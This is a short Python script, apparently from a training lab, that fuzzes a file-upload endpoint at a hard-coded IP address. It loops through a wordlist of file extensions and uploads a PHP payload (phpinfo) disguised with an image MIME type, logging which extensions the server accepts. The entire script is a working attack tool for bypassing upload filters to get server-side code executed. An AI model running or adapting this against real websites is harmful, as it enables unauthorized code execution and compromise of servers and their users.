import requests

url = "http://94.237.50.242:40904/upload.php"
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Origin": "http://94.237.50.242:40904",
    "Referer": "http://94.237.50.242:40904/",
    "Connection": "keep-alive"
}

files = {
    "uploadFile": ("abc.asp", "<?php phpinfo(); ?>", "image/jpeg")
}

filename = "File-Extensions-Wordlist.txt"


with open(filename, 'r', encoding='utf-8') as file:
    for line in file:
        a = line.strip()
        files = {
            "uploadFile": (f"abc.{a}", "<?php phpinfo(); ?>", "image/jpeg")
        }
        response = requests.post(url, headers=headers, files=files)
        print(a+ ": " +response.text)
        f = open("result.txt", "a")
        f.write(a+ ": " +response.text + "\n")
        f.close()

print(response.text)
